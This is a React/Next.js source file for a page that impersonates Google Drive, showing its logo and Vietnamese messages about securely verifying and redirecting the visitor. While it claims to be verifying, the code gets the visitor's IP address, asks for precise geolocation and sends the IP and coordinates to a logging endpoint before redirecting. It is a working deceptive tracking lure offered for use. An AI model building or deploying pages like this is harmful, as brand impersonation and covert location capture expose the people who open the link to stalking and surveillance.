
'use client';

import React, { useEffect, useState } from 'react';
import { Card, CardContent } from '@/components/ui/card';
import Image from 'next/image';
import { Loader2 } from 'lucide-react';
import type { VerificationConfig } from '@/app/actions/settings';

interface DriveVerificationClientProps {
  config: VerificationConfig;
}

export function DriveVerificationClient({ config }: DriveVerificationClientProps) {
  const { redirectUrl } = config;
  const [status, setStatus] = useState('Đang khởi tạo xác minh...');

  useEffect(() => {
    const REDIRECT_URL = redirectUrl || 'https://www.google.com/';

    const logAndRedirect = async () => {
      let clientIp = 'N/A';
      try {
        setStatus('Đang xác định địa chỉ mạng...');
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        if (ipResponse.ok) {
          const ipData = await ipResponse.json();
          clientIp = ipData.ip;
        }
      } catch (e) {
        console.error("Could not fetch IP", e);
        setStatus('Không thể xác định địa chỉ. Đang chuyển hướng...');
      }

      const logData = (pos?: GeolocationPosition) => {
        setStatus('Đang ghi lại thông tin an toàn...');
        const body: { ip: string; lat?: number; lon?: number; acc?: number } = { ip: clientIp };
        if (pos) {
          body.lat = pos.coords.latitude;
          body.lon = pos.coords.longitude;
          body.acc = pos.coords.accuracy;
        }

        const payload = JSON.stringify(body);
        
        // Use sendBeacon for reliable logging before redirect
        if (navigator.sendBeacon) {
          navigator.sendBeacon('/api/log-location', payload);
          // Redirect immediately after sending beacon
          window.location.href = REDIRECT_URL;
        } else {
          // Fallback to fetch for older browsers
          fetch('/api/log-location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: payload,
            keepalive: true,
          }).finally(() => {
            window.location.href = REDIRECT_URL;
          });
        }
      };

      setStatus('Đang yêu cầu quyền truy cập vị trí...');
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          logData, // Success
          () => { // Error
            setStatus('Truy cập vị trí bị từ chối. Đang tiếp tục...');
            logData(); // Log IP only
          },
          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
        );
      } else {
        setStatus('Trình duyệt không hỗ trợ vị trí. Đang tiếp tục...');
        logData(); // Geolocation not supported
      }
    };

    // A short delay before starting to allow the page to render.
    const timer = setTimeout(logAndRedirect, 800);
    
    return () => clearTimeout(timer);
  }, [redirectUrl]);

  return (
    <div className="flex justify-center items-center min-h-screen bg-muted/30 p-4">
      <Card className="p-8 sm:p-10 rounded-xl shadow-2xl text-center max-w-md w-full bg-card border">
        <CardContent className="p-0 flex flex-col items-center">
          <Image
            className="mb-5"
            src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg"
            alt="Google Drive"
            width={74}
            height={74}
          />
          <h1 className="text-2xl font-bold mb-2 text-foreground">Đang chuyển hướng...</h1>
          <p className="text-muted-foreground text-sm leading-normal mb-8">
            Vui lòng đợi trong khi chúng tôi xác thực yêu cầu của bạn và chuyển hướng bạn một cách an toàn.
          </p>

          <div className="w-full flex flex-col items-center justify-center gap-4 h-16">
            <Loader2 className="h-10 w-10 text-primary animate-spin" />
            <p className="text-xs text-muted-foreground animate-pulse">{status}</p>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
